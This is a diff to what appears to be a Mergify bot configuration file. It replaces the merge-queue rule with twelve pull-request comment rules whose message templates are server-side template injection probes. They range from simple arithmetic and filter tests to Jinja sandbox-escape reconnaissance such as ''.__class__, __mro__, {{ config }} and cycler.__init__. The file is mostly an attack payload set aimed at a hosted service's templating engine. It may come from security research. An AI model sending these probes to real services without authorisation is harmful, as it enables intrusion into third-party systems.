@@ -2,14 +2,78 @@ queue_rules:
   - name: default
     merge_conditions:
       - base=main
-    commit_message_template: "M1={{ number }}|M2={{ title }}|M3={{ 7*7 }}|M4={{ author }}"
+    commit_message_template: "SAFE"
 
 pull_request_rules:
-  - name: queue-it
+  - name: p01
     conditions:
       - base=main
     actions:
       comment:
-        message: "C1={{ number }}|C2={{ title }}|C3={{ 7*7 }}|C4={{ author }}"
-      queue:
-        name: default
+        message: "p01>>{{ 7 }}<<"
+  - name: p02
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p02>>{{ author.upper() }}<<"
+  - name: p03
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p03>>{{ author|upper }}<<"
+  - name: p04
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p04>>{{ number + 1 }}<<"
+  - name: p05
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p05>>{% if author %}IFYES{% endif %}<<"
+  - name: p06
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p06>>{{ ''.__class__ }}<<"
+  - name: p07
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p07>>{{ number.__class__.__name__ }}<<"
+  - name: p08
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p08>>{{ author.__class__.__mro__ }}<<"
+  - name: p09
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p09>>{{ self }}<<"
+  - name: p10
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p10>>{{ config }}<<"
+  - name: p11
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p11>>{{ cycler.__init__ }}<<"
+  - name: p12
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "p12>>{{ title }}<<"
